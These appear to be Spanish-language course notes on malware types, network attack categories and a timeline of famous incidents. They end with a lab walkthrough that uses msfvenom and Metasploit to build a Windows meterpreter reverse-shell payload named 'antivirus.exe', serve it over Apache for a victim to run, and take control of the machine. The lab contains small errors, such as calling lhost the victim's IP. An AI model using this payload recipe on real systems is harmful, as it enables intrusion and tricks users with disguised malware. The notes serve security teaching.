# Tipos de Amezada
## Virus
un programa necesita ser ejecuto para funcionar y su funcion es propagarse.
## Gusanos
Se autoreplica y propaga en todos los host conectados.
## Caballo de Troya
No se replica y se escribe para asemejarse a un programa legitimo, pero por dentro esta escondida la herramienta de ataque.
## Ransomware
Deniega el acceso al equipo y exige un rescate.
## Spyware
Recopila Informacion y la envia sin consentimiento.
## Adware
Muestra Pop-up para generar ingresos al creador.
## Scareware
Software de estafa para generar ansiedad o amenza para la utilizacion
## Phishing
Intenta obtener informacion a travez de ingeneria social
## Rootkits
Se mantiene funcionando en segundo plano con acceso privilegiado a un usuario remoto


# Tipos de Ataques
## Ataque de Reconocimiento
Deteccion y esquematizacion no autorizado en sistemas vulnerables
- Activo(Escaneo de Puertos o Vulnerabilidades) y el pasivo(OSINT)
## Ataque de Acceso
Manipulacion no autorizada de datos, de accesos al sistema o de privilegio de usuarios
Explotan vulnerabilidades de servicios FTP, Web, etc. El mas conocido es el "Ataque a Contraseñas", en donde se implementan programas detectores de paquetes, o ataques de fuerza bruta
## Denegacion de Servicio (DoS)
Consisten en desactivar o dañar redes, sistemas o servicios
Son Perkines los que los hacen, debido a que no requieren poder de computo
Ejemplos:
- Sql Slammer Worm

| Sobrecarga de Recursos                             | Datos mal Formados                         |
| -------------------------------------------------- | ------------------------------------------ |
| Espacio en Disco<br>Ancho de banda<br>Buferes      | Paquetes mal formados<br>Ping de la Muerte |
| Saturacion de Ping(Smurf)                          | Paquete Superpuesto(winuke)                |
| Tormentas de paquetes(Bombas UDP)<br>(Flaggle)<br> | Datos no gestionados(Teardrop)             |

Linea de Tiempo de los ataques mas conocidos:
- 1978: Primer Spam ArpaNet
- 1988: Morris
- 1999: Melissa
- 2000: DoS Mafiaboy, Gusano Love Bug, Cracket L0phtCrack
- 2001: DoS Code Red: Ataco 350.000 Servidores en 2001, causando DoS a millones de usuarios
- 2004: Botnet contra sistemas militares EEUU
- 2007: Storm Botnet, Filtrado de tarjetas TJX
- 2008: Fraude Societe Generale

Empresas contra el Malware
SysAdmin, Audit, Network, Security Institute ([Sans](https://www.sans.org))
Computer Emergency Response Team ([Cert](https://www.cert.org))
International Information Systems Security Certification Consortium ([(ISC)²](https://www.isc2.org/))


## Generando Malware
Usando VM Kali con adaptador puente
### Generar Exploit Kali
> Configurar teclado latinoamerica
```
setxkbmap -layout latam
```

> Crear Archivo corrupto con MSFvenom
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip-victima] lport=4444 -f exe -a x86 > antivirus.exe
```
- `-p`: plataforma destino/metodo ataque/ataque
- `lhost`: ip equipo a atacar
- `lport`: puerto a usar
- `-f`: tipo de archivo
- `-a`: arquitectura a elegir
- `>`: Envia `stdout` a el archivo que nombremos

> Abrir consola metasploitable
```
msfconsole
```

> Cargar Consola Ataque
```
use exploit/multi/handler
```

> Cargar Tipo de ataque
```
set payload windows/meterpreter/reverse_tcp
```

> Configurar IP Kali
```
set lhost 192.168.65.128
```

> Configurar Puerto Kali a la Escucha
```
set lport 4444
```

> Cargar exploit
```
exploit
```

### Pasar el Archivo a Windows
> Subir archivos a la web de kali
```
mkdir -p /var/www/html/shares
cp antivirus.exe /var/www/html/share
service apache2 start
service apache2 status
```

Desde windows se debe abrir la ip de kali desde un navegador, descargar `antivirus.exe` y ejecutarlos

### Control desde kali

Cuando windows ejecute el archivo, activara el ataque de `reverse_tcp` permitiendo el acceso a la maquina windows vulnerable
> Ver informacion del sistema
```
sysinfo
```
> Tomar Screenshot
```
screenshot
```
> Tener acceso al sistema de ficheros
```
nc -vlp 4444
```
